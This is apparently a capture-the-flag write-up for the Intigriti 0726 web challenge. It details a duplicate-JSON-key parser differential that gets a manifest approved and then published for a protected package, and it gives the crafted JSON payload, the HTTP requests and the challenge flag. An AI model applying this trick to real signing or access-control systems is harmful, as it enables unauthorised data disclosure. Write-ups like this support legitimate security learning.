---
layout: default
title: Intigriti 0726 — Canonically Yours
---

# Intigriti 0726 — Canonically Yours

Write-up for the Registry Observatory challenge.

## Challenge information

- Target: `https://challenge-0726.intigriti.io`
- Category: Web
- Vulnerability: Duplicate JSON-key parser differential
- Impact: Broken access control and protected-report disclosure


## Step 1 - Create an account

I created a normal account on the challenge website. The application assigned a
unique private namespace to the account.

<img width="2480" height="1356" alt="image" src="https://github.com/user-attachments/assets/225b2992-8b8e-4e48-9440-0ae146430a03" />


## Step 2 - Obtain the namespace and CSRF token

After logging in, I inspected the authenticated API request below:

```http
GET /api/me HTTP/2
Host: challenge-0726.intigriti.io
```

The response contains the assigned private namespace and a CSRF token required
for protected POST requests.

```json
{
  "user": {
    "username": "REDACTED",
    "namespace": "YOUR_NAMESPACE"
  },
  "csrf_token": "REDACTED"
}
```


<img width="2068" height="1186" alt="image" src="https://github.com/user-attachments/assets/38bff473-c953-4475-8983-714b8bf4b7ca" />


## Step 3 - Identify the protected package

The Observatory Archive contains package transfer records, component details,
and version references.

The records identify the protected target:

```text
Namespace: core
Package: security-notes
Version: 1.0.0
```

Therefore, the protected report belongs to:

```text
@core/security-notes@1.0.0
```


<img width="2545" height="1308" alt="image" src="https://github.com/user-attachments/assets/42c7a8a1-9256-4e1e-9ce1-8a4218e846e3" />


## Step 4 - Understand the normal manifest workflow

The Manifest Studio lets a user create a manifest, request a time-limited
approval, and run a read-only preflight report.

A normal report for the owned `legacy-adapter` package revealed this hint:

```text
Historical ingestion retains the initial package declaration;
report rendering uses reconstructed manifest data.
```

This indicated that different components might interpret the manifest
differently.


<img width="2144" height="957" alt="image" src="https://github.com/user-attachments/assets/21a0fa52-661e-43f7-980b-0b10f220cd43" />



## Step 5 - Intercept Request in Burpsuite find the endpoint named /api/manifests/sign and create a duplicate-key manifest

I created a raw JSON manifest with two top-level properties named `package`.
Replace `YOUR_NAMESPACE` with the namespace returned by `/api/me`.

```json
{
  "package": {
    "scope": "YOUR_NAMESPACE",
    "name": "legacy-adapter",
    "version": "0.9.0"
  },
  "package": {
    "scope": "core",
    "name": "security-notes",
    "version": "1.0.0"
  },
  "metadata": {
    "description": "Compatibility check",
    "visibility": "private"
  },
  "operation": "preflight"
}
```

The first package belongs to the current account:

```text
@YOUR_NAMESPACE/legacy-adapter
```

The second package references the protected target:

```text
@core/security-notes
```
<img width="1460" height="291" alt="image" src="https://github.com/user-attachments/assets/bb8e9265-c348-4e9c-998a-0ff7b6781d7b" />

<img width="2234" height="1191" alt="image" src="https://github.com/user-attachments/assets/1f6ff753-5438-457f-b1d8-227d67e7a914" />




I Base64-encoded the exact raw JSON without formatting it. JSON formatters can
remove duplicate object keys, which would break the proof of concept.


## Step 6 - Request manifest approval

I sent the Base64-encoded manifest to the signing endpoint:

```http
POST /api/manifests/sign HTTP/2
Host: challenge-0726.intigriti.io
Content-Type: application/json
X-Csrf-Token: REDACTED
Cookie: REDACTED

{
  "manifest_b64": "BASE64_ENCODED_DUPLICATE_KEY_MANIFEST"
}
```

The application accepted the manifest and returned a valid approval.

<img width="2094" height="1263" alt="image" src="https://github.com/user-attachments/assets/fe4c3fc8-d324-4f3a-990a-b5a3d2d1d18c" />


## Step 7 - Publish the exact same signed manifest

I added and sent the exact same Base64 manifest and the approval fields to:

Note: add the csrftoken and Content-Type: application/json

```http
POST /api/publications HTTP/2
Host: challenge-0726.intigriti.io
Content-Type: application/json
X-Csrf-Token: REDACTED
Cookie: REDACTED

{
  "manifest_b64": "THE_EXACT_SAME_BASE64_VALUE",
  "approval_id": "REDACTED",
  "manifest_sha256": "REDACTED",
  "nonce": "REDACTED",
  "expires_at": 0,
  "signature": "REDACTED"
}
```

The server created a ready publication and returned a publication ID.

<img width="2033" height="1144" alt="image" src="https://github.com/user-attachments/assets/6691dc57-c7db-4cf4-950e-dd7320892d5c" />





## Step 8 Retrieve the protected report

I requested the generated report:

```http
GET /api/publications/PUBLICATION_ID HTTP/2
Host: challenge-0726.intigriti.io
Cookie: REDACTED
```

The report was generated for the protected package:

```text
@core/security-notes@1.0.0
```

<img width="2038" height="1254" alt="image" src="https://github.com/user-attachments/assets/b3ab023f-c509-4df0-9085-cc15e0cc4f8c" />

## Flag

```text
INTIGRITI{019f8700-4613-74fb-923e-781903e4bee9}
